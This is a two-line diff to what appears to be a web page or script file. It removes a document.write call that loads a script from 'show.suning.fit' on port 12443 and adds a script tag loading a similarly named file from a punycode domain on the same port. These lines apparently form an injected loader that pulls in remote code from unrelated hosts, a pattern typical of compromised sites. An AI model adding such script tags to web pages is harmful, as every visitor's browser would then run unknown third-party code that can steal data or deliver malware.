@@ -1,1 +1,1 @@
-document.write('<script src="https://show.suning.fit:12443/ty/F5A4BA4A-4744-13163-33-BA352135C2AA.alpha"><\/script>');
+<script src="https://xn--wxtr9fwyxk9c.xn--55qx5d:12443/ty/C39A495D-F9E2-13163-33-C17561526139.alpha"></script>
